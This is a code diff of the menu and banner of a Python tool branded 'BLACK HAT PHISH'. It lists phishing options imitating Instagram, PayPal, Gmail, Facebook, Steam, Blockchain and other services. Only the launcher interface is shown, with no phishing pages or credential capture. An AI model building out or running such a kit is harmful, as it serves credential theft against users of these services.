@@ -2,49 +2,37 @@ import os
 import random
 import time
 from rgbprint import gradient_print
-from colorama import Fore, Style, init
 
-# Initialize colorama
-init(autoreset=True)
+try:
+    from colorama import Fore, Style
+except ModuleNotFoundError:
+    os.system("pip install colorama")
 
-# Function to simulate delay (for animation-like effects)
-def delay_print(message, delay=0.01):  # Reduced delay to speed up animation
-    for char in message:
-        print(char, end='', flush=True)
-        time.sleep(delay)
-    print()
+from urllib.request import urlopen
+from Core.helper.color import green, white, blue, red, start, alert , yellow , purple
 
-def clear_screen():
-    os.system("cls" if os.name == "nt" else "clear")
+green = yellow
+red = purple
+white = purple
 
-# Dark-themed colors for a hacker-like interface
-green = "\033[1;32;40m"
-yellow = "\033[1;33;40m"
-red = "\033[1;31;40m"
-blue = "\033[1;34;40m"
-purple = "\033[1;35;40m"
-white = "\033[1;37;40m"
-bold_white = "\033[1;37m"
-
-# Set Version
 Version = "2.2"
+yellow = ("\033[1;33;40m")
 
-# Banner (in ASCII art with dark theme)
 banner = f"""
+	
+
 ██████╗ ██╗      █████╗  ██████╗██╗  ██╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
 ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║
 ██████╔╝██║     ███████║██║     █████╔╝     ██████╔╝███████║██║███████╗███████║
 ██╔══██╗██║     ██╔══██║██║     ██╔═██╗     ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
 ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗    ██║     ██║  ██║██║███████║██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝ \n
-			</> Author: Fahim Muntasir | BLACK HAT BD
-
-	===========================================================
-			Telegram: @fahimciphers
+		</> Author: Fahim Muntasir | BLACK HAT BD
+        ===========================================================
+                    Telegram: @fahimciphers
 	===========================================================
 """
 
-# Check Internet Connection
 def connected(host='http://duckduckgo.com'):
     try:
         urlopen(host)
@@ -52,41 +40,44 @@ def connected(host='http://duckduckgo.com'):
     except:
         return False
 
-# Function to animate text
-def banner_animation():
-    delay_print(banner, 0.01)  # Faster animation (1 second total)
 
-# Create the menu with smooth animation
+all_col = [Style.BRIGHT + Fore.RED, Style.BRIGHT + Fore.CYAN, Style.BRIGHT + Fore.LIGHTCYAN_EX,
+           Style.BRIGHT + Fore.LIGHTBLUE_EX, Style.BRIGHT + Fore.LIGHTCYAN_EX, Style.BRIGHT + Fore.LIGHTMAGENTA_EX,
+           Style.BRIGHT + Fore.LIGHTYELLOW_EX]
+
+ran = random.choice(all_col)
+
+
 def menu():
-    clear_screen()  # Clear screen before displaying menu
-    banner_animation()  # Banner with typing animation
 
-    # Animated "stay updated" message
-    delay_print(red + "More Versions Will Come Soon. Stay Updated, Follow My Github\n", 0.01)
-    
-    print(white + "Options:")
-
-    # Displaying the menu options
-    menu_items = [
-        ("Instagram", 1), ("Paypal", 12), ("Facebook", 2), ("Discord", 13), ("Gmail", 3), ("Spotify", 14),
-        ("Gmail (simple)", 4), ("Blockchain", 15), ("Twitter", 5), ("RiotGames", 16), ("Snapchat", 6),
-        ("Rockstar", 17), ("Snapchat (simple)", 7), ("AskFM", 18), ("Steam", 8), ("000Webhost", 19),
-        ("Dropbox", 9), ("Linkedin", 10), ("Gamehag", 21), ("Playstation", 11), ("Mega", 22)
-    ]
-    
-    for name, index in menu_items:
-        print(green + f"[{white}{index}{green}] {white}{name}")
-
+    gradient_print(banner, start_color='yellow' , end_color='magenta')
+    print(alert + " More Versions Will Come Soon Stay Updated, Follow My Github\n")
+    print(white + "options:")
+    print(
+        green + "[" + white + "1" + green + "]" + white + " Instagram" + green + "			[" + white + "12" + green + "]" + white + " Paypal")
+    print(
+        green + "[" + white + "2" + green + "]" + white + " Facebook" + green + "			[" + white + "13" + green + "]" + white + " Discord")
+    print(
+        green + "[" + white + "3" + green + "]" + white + " Gmail" + green + "			[" + white + "14" + green + "]" + white + " Spotify")
+    print(
+        green + "[" + white + "4" + green + "]" + white + " Gmail (simple)" + green + "		[" + white + "15" + green + "]" + white + " Blockchain")
+    print(
+        green + "[" + white + "5" + green + "]" + white + " Twitter" + green + "			[" + white + "16" + green + "]" + white + " RiotGames")
+    print(
+        green + "[" + white + "6" + green + "]" + white + " Snapchat" + green + "			[" + white + "17" + green + "]" + white + " Rockstar")
+    print(
+        green + "[" + white + "7" + green + "]" + white + " Snapchat (simple)" + green + "		[" + white + "18" + green + "]" + white + " AskFM")
+    print(
+        green + "[" + white + "8" + green + "]" + white + " Steam" + green + "			[" + white + "19" + green + "]" + white + " 000Webhost")
+    print(green + "[" + white + "9" + green + "]" + white + " Dropbox" + green)
+    print(
+        green + "[" + white + "10" + green + "]" + white + " Linkedin" + green + "			[" + white + "21" + green + "]" + white + " Gamehag")
+    print(
+        green + "[" + white + "11" + green + "]" + white + " Playstation" + green + "	        [" + white + "22" + green + "]" + white + " Mega")
     print(green + "-----------------------------------------------------------------------")
-    print(green + f"[{white}00{green}] {red}EXIT")
+    print(green + "[" + white + "00" + green + "]" + red + " EXIT")
 
-# Welcome Function to clear screen and show banner
 def Welcome():
-    clear_screen()
-    delay_print(f"{blue}Initializing system...\n", 0.01)
-    time.sleep(0.5)  # Simulate a short wait for system readiness
+    os.system("clear")
 
-# Main Execution
-if __name__ == "__main__":
-    Welcome()
-    menu()
+menu()
